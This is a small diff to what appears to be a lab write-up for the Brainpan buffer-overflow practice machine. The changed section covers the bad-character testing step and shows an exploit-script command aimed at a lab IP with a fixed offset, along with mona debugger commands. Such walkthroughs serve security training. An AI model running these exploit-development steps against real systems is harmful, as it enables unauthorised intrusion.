@@ -74,7 +74,7 @@ Offset for length 600: 524
 
 ## 4. Test for bad chars
 
-Write bad chars to found memory position to find out which chars we have to exclude from our exploit:
+Write bad chars to find out which chars we have to exclude from our exploit:
 ```
 ./ig-buffer-overflow.py -m write --rhost=192.168.90.136 --rport=9999 --buffsize=600 --buffhead='' --offset=524 --hexcontent=BBBBBBBB --before=badchar --exclude=00 --nopsb=2
 ```
@@ -83,7 +83,7 @@ Write bad chars to found memory position to find out which chars we have to excl
 ```
 !mona config -set workingfolder c:\temp
 !mona bytearray
-!mona compare -f c:\monalogs\brainpan_2164\bytearray.bin -a 005FF80B
+!mona compare -f c:\temp\bytearray.bin -a 005FF80B
 ```
 ![8](imgs/brainpan-writeup8.png?raw=true)
 
